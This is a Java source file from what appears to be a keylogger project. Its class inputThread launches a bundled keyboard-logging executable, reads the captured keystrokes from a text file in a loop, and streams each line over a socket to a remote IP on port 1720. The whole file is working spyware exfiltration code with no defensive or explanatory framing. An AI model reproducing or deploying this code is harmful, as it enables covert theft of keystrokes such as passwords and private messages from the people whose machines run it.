package com.company;

//import java.io.IOException;
//import java.io.PrintWriter;
import java.net.Socket;

import java.io.*;
import java.lang.*;

public class inputThread extends Thread{
    String ipAddress ;
    public inputThread(String ipAddr){
        ipAddress = ipAddr;
    }
    @Override
    public void run() {
        Runtime r=Runtime.getRuntime();
        Process p=null;
        String host = ipAddress;
        int port = 1720;
        try (Socket socket = new Socket(host, port)) {
            PrintWriter out = new PrintWriter(socket.getOutputStream(), true);
            String path = System.getProperty("user.dir");
            p=r.exec(path + "\\src\\com\\company\\keyLogger\\keyBoard.exe");

            System.out.println(path + "\\src\\com\\company\\keyLogger\\input.txt");
            path = path + "\\src\\com\\company\\keyLogger\\input.txt";

            BufferedReader br = new BufferedReader(new FileReader(path));
            String line;
            while (true) {
                line = br.readLine();
                if (line != null) {
                    out.println(line);
                } else {
                        try {
                            Thread.sleep(100);
                        }catch(InterruptedException e){
                            Thread.currentThread().interrupt();
                        }
                    }
            }
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
}
